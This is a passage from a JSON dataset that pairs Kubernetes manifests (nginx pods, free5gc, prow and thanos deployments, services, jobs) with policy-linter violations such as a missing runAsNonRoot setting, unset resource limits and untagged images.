    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3362\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "11559",
    "manifest_path": "data/manifests/the_stack_sample/sample_4454.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3362\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "11560",
    "manifest_path": "data/manifests/the_stack_sample/sample_4454.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-3362\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "11561",
    "manifest_path": "data/manifests/the_stack_sample/sample_4456.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: hello-svc-pd\n  namespace: policy-demo\n  labels:\n    app: hello-svc\nspec:\n  selector:\n    app: hello\n  type: NodePort\n  ports:\n  - port: 80\n    targetPort: 80\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:hello])"
  },
  {
    "id": "11562",
    "manifest_path": "data/manifests/the_stack_sample/sample_4460.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app.kubernetes.io/component: rule-evaluation-engine\n    app.kubernetes.io/instance: thanos-rule\n    app.kubernetes.io/name: thanos-rule\n    app.kubernetes.io/version: v0.22.0\n  name: thanos-rule\n  namespace: thanos\nspec:\n  clusterIP: None\n  ports:\n  - name: grpc\n    port: 10901\n    targetPort: 10901\n  - name: http\n    port: 10902\n    targetPort: 10902\n  - name: reloader\n    port: 9533\n    targetPort: 9533\n  selector:\n    app.kubernetes.io/component: rule-evaluation-engine\n    app.kubernetes.io/instance: thanos-rule\n    app.kubernetes.io/name: thanos-rule\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:rule-evaluation-engine app.kubernetes.io/instance:thanos-rule app.kubernetes.io/name:thanos-rule])"
  },
  {
    "id": "11563",
    "manifest_path": "data/manifests/the_stack_sample/sample_4462.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: hello-py\nspec:\n  template:\n    metadata:\n      name: hello-py\n    spec:\n      containers:\n      - name: cisrun\n        image: bodom0015/cis_interface\n        args:\n        - $(YAML_FILES)\n        env:\n        - name: RABBIT_HOST\n          value: $(RABBITMQ_SERVICE_HOST)\n        - name: RABBIT_NAMESPACE\n          value: apiserver\n        - name: YAML_FILES\n          value: /usr/local/lib/python3.6/site-packages/cis_interface/examples/hello/hello_python.yml\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "11564",
    "manifest_path": "data/manifests/the_stack_sample/sample_4462.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: hello-py\nspec:\n  template:\n    metadata:\n      name: hello-py\n    spec:\n      containers:\n      - name: cisrun\n        image: bodom0015/cis_interface\n        args:\n        - $(YAML_FILES)\n        env:\n        - name: RABBIT_HOST\n          value: $(RABBITMQ_SERVICE_HOST)\n        - name: RABBIT_NAMESPACE\n          value: apiserver\n        - name: YAML_FILES\n          value: /usr/local/lib/python3.6/site-packages/cis_interface/examples/hello/hello_python.yml\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cisrun\" is using an invalid container image, \"bodom0015/cis_interface\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11565",
    "manifest_path": "data/manifests/the_stack_sample/sample_4462.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: hello-py\nspec:\n  template:\n    metadata:\n      name: hello-py\n    spec:\n      containers:\n      - name: cisrun\n        image: bodom0015/cis_interface\n        args:\n        - $(YAML_FILES)\n        env:\n        - name: RABBIT_HOST\n          value: $(RABBITMQ_SERVICE_HOST)\n        - name: RABBIT_NAMESPACE\n          value: apiserver\n        - name: YAML_FILES\n          value: /usr/local/lib/python3.6/site-packages/cis_interface/examples/hello/hello_python.yml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cisrun\" does not have a read-only root file system"
  },
  {
    "id": "11566",
    "manifest_path": "data/manifests/the_stack_sample/sample_4462.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: hello-py\nspec:\n  template:\n    metadata:\n      name: hello-py\n    spec:\n      containers:\n      - name: cisrun\n        image: bodom0015/cis_interface\n        args:\n        - $(YAML_FILES)\n        env:\n        - name: RABBIT_HOST\n          value: $(RABBITMQ_SERVICE_HOST)\n        - name: RABBIT_NAMESPACE\n          value: apiserver\n        - name: YAML_FILES\n          value: /usr/local/lib/python3.6/site-packages/cis_interface/examples/hello/hello_python.yml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cisrun\" is not set to runAsNonRoot"
  },
  {
    "id": "11567",
    "manifest_path": "data/manifests/the_stack_sample/sample_4462.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: hello-py\nspec:\n  template:\n    metadata:\n      name: hello-py\n    spec:\n      containers:\n      - name: cisrun\n        image: bodom0015/cis_interface\n        args:\n        - $(YAML_FILES)\n        env:\n        - name: RABBIT_HOST\n          value: $(RABBITMQ_SERVICE_HOST)\n        - name: RABBIT_NAMESPACE\n          value: apiserver\n        - name: YAML_FILES\n          value: /usr/local/lib/python3.6/site-packages/cis_interface/examples/hello/hello_python.yml\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cisrun\" has cpu request 0"
  },
  {
    "id": "11568",
    "manifest_path": "data/manifests/the_stack_sample/sample_4462.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: hello-py\nspec:\n  template:\n    metadata:\n      name: hello-py\n    spec:\n      containers:\n      - name: cisrun\n        image: bodom0015/cis_interface\n        args:\n        - $(YAML_FILES)\n        env:\n        - name: RABBIT_HOST\n          value: $(RABBITMQ_SERVICE_HOST)\n        - name: RABBIT_NAMESPACE\n          value: apiserver\n        - name: YAML_FILES\n          value: /usr/local/lib/python3.6/site-packages/cis_interface/examples/hello/hello_python.yml\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cisrun\" has memory limit 0"
  },
  {
    "id": "11569",
    "manifest_path": "data/manifests/the_stack_sample/sample_4463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ausf-deployment\nspec:\n  selector:\n    matchLabels:\n      app: free5gc-ausf\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: free5gc-ausf\n    spec:\n      containers:\n      - name: myapp-container\n        image: free5gmano/free5gc-control-plane\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - ./bin/ausf\n        volumeMounts:\n        - name: ausfcfg\n          mountPath: /go/src/free5gc/config/ausfcfg.conf\n          subPath: ausfcfg.conf\n        - name: free5gc\n          mountPath: /go/src/free5gc/config/free5GC.conf\n          subPath: free5GC.conf\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.4/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: ausfcfg\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: ausfcfg.conf\n            path: ausfcfg.conf\n      - name: free5gc\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: free5GC.conf\n            path: free5GC.conf\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"myapp-container\" is using an invalid container image, \"free5gmano/free5gc-control-plane\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11570",
    "manifest_path": "data/manifests/the_stack_sample/sample_4463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ausf-deployment\nspec:\n  selector:\n    matchLabels:\n      app: free5gc-ausf\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: free5gc-ausf\n    spec:\n      containers:\n      - name: myapp-container\n        image: free5gmano/free5gc-control-plane\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - ./bin/ausf\n        volumeMounts:\n        - name: ausfcfg\n          mountPath: /go/src/free5gc/config/ausfcfg.conf\n          subPath: ausfcfg.conf\n        - name: free5gc\n          mountPath: /go/src/free5gc/config/free5GC.conf\n          subPath: free5GC.conf\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.4/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: ausfcfg\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: ausfcfg.conf\n            path: ausfcfg.conf\n      - name: free5gc\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: free5GC.conf\n            path: free5GC.conf\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-network-client\" does not have a read-only root file system"
  },
  {
    "id": "11571",
    "manifest_path": "data/manifests/the_stack_sample/sample_4463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ausf-deployment\nspec:\n  selector:\n    matchLabels:\n      app: free5gc-ausf\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: free5gc-ausf\n    spec:\n      containers:\n      - name: myapp-container\n        image: free5gmano/free5gc-control-plane\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - ./bin/ausf\n        volumeMounts:\n        - name: ausfcfg\n          mountPath: /go/src/free5gc/config/ausfcfg.conf\n          subPath: ausfcfg.conf\n        - name: free5gc\n          mountPath: /go/src/free5gc/config/free5GC.conf\n          subPath: free5GC.conf\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.4/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: ausfcfg\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: ausfcfg.conf\n            path: ausfcfg.conf\n      - name: free5gc\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: free5GC.conf\n            path: free5GC.conf\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"myapp-container\" does not have a read-only root file system"
  },
  {
    "id": "11572",
    "manifest_path": "data/manifests/the_stack_sample/sample_4463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ausf-deployment\nspec:\n  selector:\n    matchLabels:\n      app: free5gc-ausf\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: free5gc-ausf\n    spec:\n      containers:\n      - name: myapp-container\n        image: free5gmano/free5gc-control-plane\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - ./bin/ausf\n        volumeMounts:\n        - name: ausfcfg\n          mountPath: /go/src/free5gc/config/ausfcfg.conf\n          subPath: ausfcfg.conf\n        - name: free5gc\n          mountPath: /go/src/free5gc/config/free5GC.conf\n          subPath: free5GC.conf\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.4/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: ausfcfg\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: ausfcfg.conf\n            path: ausfcfg.conf\n      - name: free5gc\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: free5GC.conf\n            path: free5GC.conf\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-network-client\" is not set to runAsNonRoot"
  },
  {
    "id": "11573",
    "manifest_path": "data/manifests/the_stack_sample/sample_4463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ausf-deployment\nspec:\n  selector:\n    matchLabels:\n      app: free5gc-ausf\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: free5gc-ausf\n    spec:\n      containers:\n      - name: myapp-container\n        image: free5gmano/free5gc-control-plane\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - ./bin/ausf\n        volumeMounts:\n        - name: ausfcfg\n          mountPath: /go/src/free5gc/config/ausfcfg.conf\n          subPath: ausfcfg.conf\n        - name: free5gc\n          mountPath: /go/src/free5gc/config/free5GC.conf\n          subPath: free5GC.conf\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.4/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: ausfcfg\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: ausfcfg.conf\n            path: ausfcfg.conf\n      - name: free5gc\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: free5GC.conf\n            path: free5GC.conf\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"myapp-container\" is not set to runAsNonRoot"
  },
  {
    "id": "11574",
    "manifest_path": "data/manifests/the_stack_sample/sample_4463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ausf-deployment\nspec:\n  selector:\n    matchLabels:\n      app: free5gc-ausf\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: free5gc-ausf\n    spec:\n      containers:\n      - name: myapp-container\n        image: free5gmano/free5gc-control-plane\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - ./bin/ausf\n        volumeMounts:\n        - name: ausfcfg\n          mountPath: /go/src/free5gc/config/ausfcfg.conf\n          subPath: ausfcfg.conf\n        - name: free5gc\n          mountPath: /go/src/free5gc/config/free5GC.conf\n          subPath: free5GC.conf\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.4/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: ausfcfg\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: ausfcfg.conf\n            path: ausfcfg.conf\n      - name: free5gc\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: free5GC.conf\n            path: free5GC.conf\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-network-client\" has cpu request 0"
  },
  {
    "id": "11575",
    "manifest_path": "data/manifests/the_stack_sample/sample_4463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ausf-deployment\nspec:\n  selector:\n    matchLabels:\n      app: free5gc-ausf\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: free5gc-ausf\n    spec:\n      containers:\n      - name: myapp-container\n        image: free5gmano/free5gc-control-plane\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - ./bin/ausf\n        volumeMounts:\n        - name: ausfcfg\n          mountPath: /go/src/free5gc/config/ausfcfg.conf\n          subPath: ausfcfg.conf\n        - name: free5gc\n          mountPath: /go/src/free5gc/config/free5GC.conf\n          subPath: free5GC.conf\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.4/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: ausfcfg\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: ausfcfg.conf\n            path: ausfcfg.conf\n      - name: free5gc\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: free5GC.conf\n            path: free5GC.conf\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"myapp-container\" has cpu request 0"
  },
  {
    "id": "11576",
    "manifest_path": "data/manifests/the_stack_sample/sample_4463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ausf-deployment\nspec:\n  selector:\n    matchLabels:\n      app: free5gc-ausf\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: free5gc-ausf\n    spec:\n      containers:\n      - name: myapp-container\n        image: free5gmano/free5gc-control-plane\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - ./bin/ausf\n        volumeMounts:\n        - name: ausfcfg\n          mountPath: /go/src/free5gc/config/ausfcfg.conf\n          subPath: ausfcfg.conf\n        - name: free5gc\n          mountPath: /go/src/free5gc/config/free5GC.conf\n          subPath: free5GC.conf\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.4/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: ausfcfg\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: ausfcfg.conf\n            path: ausfcfg.conf\n      - name: free5gc\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: free5GC.conf\n            path: free5GC.conf\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-network-client\" has memory limit 0"
  },
  {
    "id": "11577",
    "manifest_path": "data/manifests/the_stack_sample/sample_4463.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: free5gc-ausf-deployment\nspec:\n  selector:\n    matchLabels:\n      app: free5gc-ausf\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: free5gc-ausf\n    spec:\n      containers:\n      - name: myapp-container\n        image: free5gmano/free5gc-control-plane\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - ./bin/ausf\n        volumeMounts:\n        - name: ausfcfg\n          mountPath: /go/src/free5gc/config/ausfcfg.conf\n          subPath: ausfcfg.conf\n        - name: free5gc\n          mountPath: /go/src/free5gc/config/free5GC.conf\n          subPath: free5GC.conf\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.168.2.4/23\n        - -g=192.168.3.254\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: ausfcfg\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: ausfcfg.conf\n            path: ausfcfg.conf\n      - name: free5gc\n        configMap:\n          name: free5gc-configmap\n          items:\n          - key: free5GC.conf\n            path: free5GC.conf\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"myapp-container\" has memory limit 0"
  },
  {
    "id": "11578",
    "manifest_path": "data/manifests/the_stack_sample/sample_4465.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20210421-8709509fc9\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pipeline\" does not have a read-only root file system"
  },
  {
    "id": "11579",
    "manifest_path": "data/manifests/the_stack_sample/sample_4465.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20210421-8709509fc9\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prow-pipeline\" not found"
  },
  {
    "id": "11580",
    "manifest_path": "data/manifests/the_stack_sample/sample_4465.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20210421-8709509fc9\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pipeline\" is not set to runAsNonRoot"
  },
  {
    "id": "11581",
    "manifest_path": "data/manifests/the_stack_sample/sample_4465.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20210421-8709509fc9\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pipeline\" has cpu request 0"
  },
  {
    "id": "11582",
    "manifest_path": "data/manifests/the_stack_sample/sample_4465.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prow-pipeline\n  namespace: default\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-pipeline\n  template:\n    metadata:\n      labels:\n        app: prow-pipeline\n    spec:\n      serviceAccountName: prow-pipeline\n      containers:\n      - name: pipeline\n        image: gcr.io/k8s-prow/pipeline:v20210421-8709509fc9\n        args:\n        - --all-contexts\n        - --config=/etc/prow-config/config.yaml\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - mountPath: /etc/prow-config\n          name: prow-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n      - name: prow-config\n        configMap:\n          name: config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pipeline\" has memory limit 0"
  },
  {
    "id": "11583",
    "manifest_path": "data/manifests/the_stack_sample/sample_4467.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: api-svc\nspec:\n  ports:\n  - name: http\n    port: 80\n    targetPort: 80\n    nodePort: 30500\n  selector:\n    app: v1.1\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:v1.1])"
  },
  {
    "id": "11584",
    "manifest_path": "data/manifests/the_stack_sample/sample_4468.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    name: book-import\n  name: book-import\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: book-import\n  template:\n    metadata:\n      labels:\n        name: book-import\n    spec:\n      containers:\n      - image: quay.io/jpacker/hugo-nginx:latest\n        name: book-import\n        ports:\n        - containerPort: 8080\n          name: http-server\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"book-import\" is using an invalid container image, \"quay.io/jpacker/hugo-nginx:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
